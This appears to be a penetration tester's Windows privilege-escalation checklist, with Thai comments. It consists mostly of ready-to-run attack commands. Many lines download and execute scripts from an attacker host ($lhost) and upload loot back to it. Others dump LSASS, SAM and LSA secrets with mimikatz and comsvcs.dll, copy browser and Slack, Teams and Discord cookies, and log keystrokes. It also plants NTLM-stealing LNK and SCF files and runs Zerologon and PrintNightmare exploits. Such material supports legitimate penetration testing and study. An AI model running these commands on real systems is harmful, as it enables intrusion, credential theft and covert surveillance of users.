### If Webserver Exists

1. Check web configuration files and source code for vulnerabilities, hardcoded credentials, etc.
- [ ] `C:\xampp\htdocs` (common with Apache)
- [ ] `C:\inetpub`

### Default Methodology

1. Run Windows Priv Esc Automation Scripts. Save output and transfer to attack box. 
- [ ] winPEAS
```Powershell
# winPEAS
.\winPEASx64.exe | Tee-Object -FilePath C:\Windows\Temp\winpeas.out
# หรือ fileless
$wp = (New-Object Net.WebClient).DownloadString('http://$lhost/winPEASx64.ps1'); IEX $wp
```

- [ ] Seatbelt
```Powershell
# Seatbelt
.\Seatbelt.exe -group=all | Tee-Object -FilePath C:\Windows\Temp\seatbelt.out
```

- [ ] PowerUp / SharpUp
```Powershell
# PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://$lhost/PowerUp.ps1'); Invoke-AllChecks

# SharpUp
.\SharpUp.exe audit | Tee-Object -FilePath C:\Windows\Temp\sharpup.out
```

- [ ] JAWS (PowerShell-based; useful if custom executables are blocked)
```Powershell
# JAWS
IEX (New-Object Net.WebClient).DownloadString('http://$lhost/jaws-enum.ps1')
```

- [ ] SessionGopher
```Powershell
# SessionGopher
IEX (New-Object Net.WebClient).DownloadString('http://$lhost/SessionGopher.ps1'); Invoke-SessionGopher -Thorough
```

- [ ] Bloodhound
```Powershell
# BloodHound
.\SharpHound.exe -c All -o C:\Windows\Temp\bh.zip
```

- [ ] Transfer files back to kali
```Bash
# บน Kali
python3 -m uploadserver 80

# บน target
(New-Object Net.WebClient).UploadFile('http://$lhost/upload', 'C:\Windows\Temp\winpeas.out')
```

2. Perform basic box enumeration once a foothold is established
- [ ] Gathering Network Information
```Powershell
# Network Information
ipconfig /all
route print
arp -a
netstat -ano
```

- [ ] Gathering System Information
```Powershell
# System Information
systeminfo
wmic os get Caption,Version,BuildNumber
wmic computersystem get Name,Domain,Manufacturer,Model
```

- [ ] Process Enumeration
```Bash
# Process Enumeration
tasklist /v
Get-Process | Select-Object Name,Id,CPU,Path
wmic process get Name,ProcessId,CommandLine
```

- [ ] User and Group Enumeration
```Powershell
# User and Group Enumeration
whoami /all
net user
net localgroup
net localgroup Administrators
wmic useraccount list full
```

3. Look at access rights of user (user privileges)
```Bash
whoami /priv
whoami /all
```
- [ ] SeImpersonate / SeAssignPrimaryToken → JuicyPotato / RoguePotato / PrintSpoofer
- [ ] SeDebugPrivilege
- [ ] SeTakeOwnershipPrivilege

4. Check if user is a member of privileged groups    
```
whoami /groups
```
- [ ] Backup Operators
- [ ] Event Log Readers
- [ ] DnsAdmins
- [ ] Hyper-V Admins
- [ ] Print Operators
- [ ] Server Operators
- [ ] WSUS Administrators

5. Check for Weak File/Service Permissions
- [ ] Permissive File System ACLs
```Powershell
# Permissive File System ACLs
icacls "C:\Program Files\*" 2>$null | findstr /i "everyone\|BUILTIN\Users\|BUILTIN\Authenticated" | findstr /i "F\|M\|W"
```

- [ ] Weak Service Permissions
```Powershell
# Weak Service Permissions
# ดู services ทั้งหมด + path
wmic service get Name,PathName,StartMode,State
Get-WmiObject Win32_Service | Select-Object Name,PathName,StartMode,State

# PowerUp ช่วยได้เลย
IEX (New-Object Net.WebClient).DownloadString('http://$lhost/PowerUp.ps1')
Get-ModifiableServiceFile
Get-ModifiableService
```

- [ ] Unquoted Service Path
```Powershell
# Unquoted Service Path
wmic service get Name,PathName | findstr /i /v "C:\Windows" | findstr /i /v """
# ถ้า path มีช่องว่างและไม่มี quotes → vulnerable
```

- [ ] Permissive Registry ACLs
```Powershell
# Permissive Registry ACLs
Get-Acl "HKLM:\System\CurrentControlSet\Services\*" | Format-List
# PowerUp
Get-ServiceUnquoted
Get-RegistryAlwaysInstallElevated
```

- [ ] Modifiable Registry Autorun Binary
```Powershell
# Modifiable Registry Autorun Binary
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# เช็ค permission ของ binary ที่ถูก reference
icacls "<path_from_autorun>"
```

5. Check for saved credentials
```Bash
cmdkey /list
```
- [ ] If we get access this way, run mimikatz to try to extract plaintext password

6. Look for services running on internal ports not accessible from outside
```Bash
netstat -ano
```
- [ ] Databases we can connect to?
- [ ] Vulnerable Services

7. Check for additional NICs
```Bash
ipconfig
```

8. Look for vulnerable applications and services
```Bash
wmic product get name
```

9. Look for interesting files on the server that may have credentials or sensitive info
```Powershell
.\LaZagne.exe all -oN C:\Windows\Temp\lazagne.out
.\Snaffler.exe -s -o C:\Windows\Temp\snaffler.out
```
- [ ] Credential Hunting
```Powershell
# Credential Hunting - common file locations
dir /s /b C:\*.txt C:\*.xml C:\*.ini C:\*.config 2>nul | findstr /i "pass\|cred\|secret\|key"
dir /s /b C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini 2>nul

# Search file contents
findstr /si "password\|passwd\|credential\|secret" C:\*.txt C:\*.xml C:\*.ini C:\*.config 2>nul
findstr /si "password" C:\Users\*\AppData\*.* 2>nul

# Common credential locations
type C:\Windows\System32\drivers\etc\hosts
type C:\inetpub\wwwroot\web.config
type C:\xampp\htdocs\config.php
dir /s /b C:\Users\*\AppData\Local\* | findstr /i "credential"

# Windows Credential Manager
cmdkey /list
vaultcmd /listcreds:"Windows Credentials"

# PowerShell history
type C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
- [ ] Dumping Hashes / Credentials (Mimikatz)
```Powershell
# Mimikatz - Dump credentials
.\mimikatz.exe

# dump all
sekurlsa::logonpasswords

# dump hashes from SAM
lsadump::sam

# dump LSA secrets
lsadump::secrets

# DCSync (ถ้ามี DA)
lsadump::dcsync /domain:example.com /all

# LSASS dump ไม่ใช้ mimikatz (evasion)
# Task Manager → Details → lsass.exe → Create dump file

# หรือด้วย comsvcs.dll
$lsass = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsass C:\Windows\Temp\lsass.dmp full

# แล้ว parse บน Kali
pypykatz lsa minidump lsass.dmp
```

10. Pillage for credentials or other interesting information
- [ ] Pillaging Applications
```Powershell
# Pillaging Applications - Browser credentials
# Chrome
copy "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp\chrome.db
copy "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Cookies" C:\Windows\Temp\chrome_cookies.db

# Firefox
dir /s /b C:\Users\$env:USERNAME\AppData\Roaming\Mozilla\Firefox\Profiles\*.sqlite
copy "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json" C:\Windows\Temp\

# Tools ช่วย
.\SharpChrome.exe logins
.\HackBrowserData.exe -b all -f json -o C:\Windows\Temp\browser_data
```

- [ ] Accessing Instant Messaging Clients Through Cookies
```Powershell
# Instant Messaging Clients Through Cookies
# Slack cookies
copy "C:\Users\$env:USERNAME\AppData\Roaming\Slack\Cookies" C:\Windows\Temp\slack_cookies

# Teams
copy "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Teams\Cookies" C:\Windows\Temp\teams_cookies

# Discord
copy "C:\Users\$env:USERNAME\AppData\Roaming\discord\Cookies" C:\Windows\Temp\discord_cookies

# Instant Messaging Clients Through Cookies
# Slack cookies
copy "C:\Users\$env:USERNAME\AppData\Roaming\Slack\Cookies" C:\Windows\Temp\slack_cookies

# Teams
copy "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Teams\Cookies" C:\Windows\Temp\teams_cookies

# Discord
copy "C:\Users\$env:USERNAME\AppData\Roaming\discord\Cookies" C:\Windows\Temp\discord_cookies
```

- [ ] Pillaging the Clipboard + Keylogging
```Powershell
# Clipboard
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::GetText()

# Keylogging
IEX (New-Object Net.WebClient).DownloadString('http://$lhost/Get-Keystrokes.ps1')
Get-Keystrokes -LogPath C:\Windows\Temp\keylog.txt
```

- [ ] Roles and Services (pillaging backups)
```Bash
# Roles and Services - Backup software credentials
# Veeam
sqlcmd -S localhost -Q "SELECT TOP 10 * FROM [VeeamBackup].[dbo].[Credentials]"

# McAfee
type "C:\ProgramData\McAfee\Common Framework\SiteList.xml"

# MSSQL
sqlcmd -S localhost -Q "SELECT name FROM master.dbo.sysdatabases"
sqlcmd -S localhost -Q "SELECT * FROM master.sys.sql_logins"

# IIS web.config
type C:\inetpub\wwwroot\web.config
findstr /si "connectionString\|password" C:\inetpub\*.config

# Backup files
dir /s /b C:\*.bak C:\*.backup C:\*backup* 2>nul
```

11. Look for scheduled tasks that we can modify
```Powershell
# ดู scheduled tasks ทั้งหมด
schtasks /query /fo LIST /v
Get-ScheduledTask | Select-Object TaskName,TaskPath,State | Format-List

# ดู task ที่รันด้วย SYSTEM หรือ high privilege
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

# เช็ค permission ของ script/binary ที่ task เรียก
Get-ScheduledTask | Select-Object TaskName -ExpandProperty Actions | Select-Object TaskName,Execute,Arguments

# เช็ค writable ไหม
icacls "C:\path\to\task\script.ps1"
icacls "C:\path\to\task\binary.exe"
```

12. Look for credentials in process command line
```Powershell
# ดู command line ของทุก process
wmic process get Name,ProcessId,CommandLine
Get-WmiObject Win32_Process | Select-Object Name,ProcessId,CommandLine | Format-List

# filter หา credentials
wmic process get CommandLine | findstr /i "pass\|pwd\|credential\|secret\|key\|-p \|--password"

# PowerShell processes โดยเฉพาะ
Get-WmiObject Win32_Process -Filter "Name='powershell.exe'" | Select-Object CommandLine
```

12. Check for 'Always Install Elevated' setting and exploit with MSI package
```Powershell
# เช็ค registry ทั้ง 2 key ต้องเป็น 1 ถึงจะ exploit ได้
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerUp เช็คให้เลย
Get-RegistryAlwaysInstallElevated
```

12. Capture hashes with a Malicious LNK file or SCF file
- [ ] **ESPECIALLY USEFUL IF USERS WILL VISIT A SHARE WE HAVE UPLOADED TO**
```Bash
# สร้าง malicious LNK ด้วย ntlm_theft บน Kali
python3 ntlm_theft.py -g lnk -s $lhost -f Important
python3 ntlm_theft.py -g scf -s $lhost -f Important

# อัป upload ขึ้น writable share
smbclient -N //target/ShareName
smb: \> put Important.lnk
smb: \> put Important.scf

# เปิด Responder รอรับ hash
sudo responder -I tun0
```

```Powershell
# ถ้ามี shell อยู่แล้ว copy ไปวางใน share ที่ user จะเข้า
copy C:\Windows\Temp\Important.lnk "\\target\Share\Important.lnk"

# Capture ด้วย Inveigh (Windows-based Responder)
IEX (New-Object Net.WebClient).DownloadString('http://$lhost/Inveigh.ps1')
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y
```

12. Look for Kernel / OS exploits
```Powershell
# ดู OS version ก่อน
systeminfo | findstr /i "OS Name\|OS Version\|System Type\|Hotfix"
wmic os get Caption,Version,BuildNumber,ServicePackMajorVersion
```

- [ ] Zero Logon (Windows Server 2019/2016/2012/2008)
```Bash
# เช็คจาก Kali
python3 zerologon_tester.py DC01 $rhost

# Exploit
python3 cve-2020-1472-exploit.py DC01 $rhost
```

- [ ] PrintNightmare
```Powershell
# เช็คว่า Print Spooler รันอยู่ไหม
Get-Service Spooler

# Exploit จาก Kali
python3 CVE-2021-1675.py domain/user:pass@$rhost '\\$lhost\share\evil.dll'

# หรือจาก Windows
.\SharpPrintNightmare.exe C:\Windows\Temp\evil.dll
```
- [ ] EOL Systems (Windows Server 2008, Windows 7, etc.)

16. Attempt to bypass UAC Controls if present
```Powershell
# เช็ค UAC level ก่อน
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = UAC disabled, 2 = always notify, 5 = default
# เงื่อนไข: user ต้องอยู่ใน local Administrators group แต่ token ยังเป็น medium integrity — UAC bypass จะ elevate ขึ้นเป็น high integrity
```

16. DLL Injection
```Powershell
# หา process ที่รันด้วย SYSTEM
tasklist /v | findstr /i "system\|nt authority"
Get-Process | Where-Object {$_.SI -eq 0}
```

16. Common Vulnerabilities and Vulnerable Programs
- [ ] Docker Desktop Community Edition before 2.1.0.1 (CVE-2019-15752)
- [ ] Windows Certificate Dialog (CVE-2019-1388)

19. Attempt to Capture Network Traffic with Inveigh/Responder, Wireshark, or Snaffler
- [ ] LLMNR/NBT-NS Poisoning From Windows/Linux
- Responder
```Bash
# Analyze mode ดูก่อนว่ามี traffic ไหม
sudo responder -I tun0 -A

# Poison + capture
sudo responder -I tun0 -wF

# ดู hashes ที่ได้
cat /usr/share/responder/logs/SMB-NTLMv2-*.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

- Inveigh
```Powershell
IEX (New-Object Net.WebClient).DownloadString('http://$lhost/Inveigh.ps1')

# รัน
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -HTTP Y

# ดู hashes
Get-InveighLog
Stop-Inveigh
```

- Wireshark
```Powershell
"C:\Program Files\Wireshark\tshark.exe" -i <interface_number> -w C:\Windows\Temp\capture.pcap
# ถ้าไม่มี Wireshark ใช้ netsh แทน
netsh trace start capture=yes tracefile=C:\Windows\Temp\capture.etl
netsh trace stop

# แปลงกลับ Kali
# etl → pcap ด้วย etl2pcapng
```

- Snalffler.exe
```Powershell
.\Snaffler.exe -s -o C:\Windows\Temp\snaffler.out -v data
```

20. Enumerate User/Computer Description Fields for cleartext credentials
```Powershell
# Local users description
net user | findstr /i "comment\|description"
wmic useraccount get Name,Description

# Local computers description  
wmic computersystem get Name,Description

# Domain users description (ถ้ามี domain creds)
Get-ADUser -Filter * -Properties Description | Select-Object Name,Description | Where-Object {$_.Description -ne $null}

# Domain computers description
Get-ADComputer -Filter * -Properties Description | Select-Object Name,Description | Where-Object {$_.Description -ne $null}

# ผ่าน PowerView
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.description -ne $null}
Get-DomainComputer * | Select-Object name,description | Where-Object {$_.description -ne $null}

# ผ่าน NetExec จาก Kali
netexec ldap $rhost -u user -p pass -M get-desc-users
```

20. If the system has `.vhd`, `.vhdx`, `.vmdk` files, mount them to dump machine hashes
```Powershell
# หาไฟล์ก่อน
Get-ChildItem -Path C:\ -Recurse -Include *.vhd,*.vhdx,*.vmdk -ErrorAction SilentlyContinue
dir /s /b C:\*.vhd C:\*.vhdx C:\*.vmdk 2>nul
```

20. Check for Active Directory Certificate Services (AD CS) attacks
```Bash
# เช็คว่ามี AD CS ไหม
certutil -config - -ping
net start | findstr -i "certificate"

# Enumerate vulnerable templates ด้วย Certify
.\Certify.exe find /vulnerable

# จาก Kali
certipy-ad find -u user@domain.com -p pass -dc-ip $rhost -vulnerable
```

20. If trying to be evasive or custom executables are locked down, check LOLBAS

### Once we are Admin

1. Attempt to recover all user passwords or NTLM hashes
- [ ] Dump the LSASS process
```Powershell
# Dump LSASS - comsvcs.dll (built-in, stealthier)
$lsass = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsass C:\Windows\Temp\lsass.dmp full

# Dump LSASS - Task Manager (GUI)
# Task Manager → Details → lsass.exe → Right Click → Create Dump File

# Dump LSASS - ProcDump (sysinternals)
.\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

```Bash
# Parse lsass.dmp บน Kali
pypykatz lsa minidump lsass.dmp

# หรือด้วย mimikatz
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

- [ ] Stealing NTLM Hashes from an LSASS.DMP Memory Dump
- [ ] Dumping the SAM Database to recover password hashes
```Powershell
# Dump SAM - registry export (ต้องการ SYSTEM)
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Mimikatz ตรงๆ ถ้า AV ไม่ block
.\mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
```

```Bash
# Parse SAM บน Kali
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```